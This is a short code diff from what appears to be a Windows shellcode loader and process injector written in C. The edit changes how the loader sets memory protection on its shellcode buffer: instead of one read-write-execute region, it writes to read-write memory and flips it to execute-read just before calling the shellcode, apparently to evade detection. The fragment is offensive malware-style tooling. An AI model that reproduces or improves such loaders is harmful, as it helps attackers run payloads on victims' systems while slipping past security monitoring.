@@ -167,7 +167,7 @@ int main(int argc, char** argv) {
 		printf("[+] Injecting shellcode into own process\n");
 
 		//Mark as executable
-		success = VirtualProtect(sc, sc_len, PAGE_EXECUTE_READWRITE, &dummy);//I would look into changing this if I were you ;)
+		success = VirtualProtect(sc, sc_len, PAGE_READWRITE, &dummy);//I would look into changing this if I were you ;)
 		if (success == 0)
 		{
 			printf("[-] VirtualProtect error = %u\n", GetLastError());
@@ -175,6 +175,7 @@ int main(int argc, char** argv) {
 		}
 		//Execute
 		printf("[+] Executing...\n");
+		success = VirtualProtect(sc, sc_len, PAGE_EXECUTE_READ, &dummy);//I would look into changing this if I were you ;)
 		((void(*)())sc)();
 	}
 	else if (argc >= 5) {//Inject into other process
